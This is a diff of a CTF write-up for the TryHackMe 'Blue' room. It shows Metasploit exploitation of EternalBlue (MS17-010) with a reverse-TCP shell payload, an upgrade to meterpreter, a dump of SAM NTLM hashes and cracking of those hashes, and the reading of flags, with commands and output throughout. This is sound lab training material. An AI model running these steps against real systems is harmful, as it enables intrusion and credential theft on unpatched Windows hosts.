@@ -1,11 +1,12 @@
 # Blue
-This is a writeup for the machine Blue on TryHackMe.
-
-
-https://tryhackme.com/room/blue
-
+In this room we learn how to use a Microsoft SMBv1 server exploit using the Metasploit tool.
 
 ## Recon
+
+The hints suggest some good flags to use in the `nmap` scan: 
+- `-sV` for version detection,
+- `-vv` verbosity,
+- `--script vuln` to run vulnerability detection scripts - and find the first answer!
 
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -45,7 +46,11 @@ Host script results:
 
 ```
 
-Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
+As the title suggests, the vuln is **EternalBlue**.
+
+---
+
+To find the exploit's code, search it in the metasploit console:
 
 ```bash
 msf6 > search eternalblue
@@ -63,13 +68,17 @@ msf6 > use exploit/windows/smb/ms17_010_eternalblue
 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
 ```
 
-Show options and set:
-- `RHOSTS` to target IP
-- `LHOST` to your IP
-- `payload` to `windows/x64/shell/reverse_tcp`
-Run and background.
+Use `show options` and set:
+- `RHOSTS` to the target's IP,
+- `LHOST` to your IP,
+- `payload` to `windows/x64/shell/reverse_tcp`.
+Now `run` the exploit and `background` this process.
+
+---
 
 ## Escalation
+
+Search online **how to upgrade a shell to meterpreter**, then look it up in metasploit console to find it's path.
 
 ```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter
@@ -84,6 +93,8 @@ Matching Modules
 
 Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter    
 ```
+
+Use it:
 
 ```bash
 msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
@@ -104,6 +115,8 @@ Module options (post/multi/manage/shell_to_meterpreter):
 
 View the full module info with the info, or info -d command.
 ```
+
+Now run `shell_to_meterpreter` on the previously backgrounded session!
 
 ```bash
 msf6 post(multi/manage/shell_to_meterpreter) > sessions
@@ -149,11 +162,19 @@ Process 1088 created.
 Channel 1 created.
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+```
 
+Check:
+
+```bash
 C:\Windows\system32>whoami
 whoami
 nt authority\system
+```
 
+And background again:
+
+```bash
 C:\Windows\system32>^Z
 Background channel 1? [y/N]  y
 meterpreter > ps
@@ -176,6 +197,10 @@ Process List
              xe
 
 ```
+
+---
+
+To migrate to other processes:
 
 ```bash
 meterpreter > migrate 2972
@@ -202,7 +227,16 @@ Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 ```
 
+For cracking these NTLM hashes I used **CrackStation**.
+
+---
+
 ## Flags
+
+Using `shell` again, explore some common places for files as instructed:
+
+- system root:
+
 ```bash
 C:\Windows\system32>cd ../../
 cd ../../
@@ -226,7 +260,11 @@ dir
 C:\>type flag1.txt
 type flag1.txt
 flag{access_the_machine}
+```
 
+- where passwords are stored within Windows:
+
+```bash
 C:\>cd \Windows\System32\Config
 cd \Windows\System32\Config
 
@@ -257,7 +295,11 @@ dir
 C:\Windows\System32\config>type flag2.txt
 type flag2.txt
 flag{sam_database_elevated_access}
+```
 
+- admin's "interesting" documents:
+
+```bash
 C:\Windows\System32\config>cd ../../../Users/Jon
 cd ../../../Users/Jon
 cd Jon
@@ -305,3 +347,5 @@ C:\Users\Jon\Documents>type flag3.txt
 type flag3.txt
 flag{admin_documents_can_be_valuable}
 ```
+
+Done! 
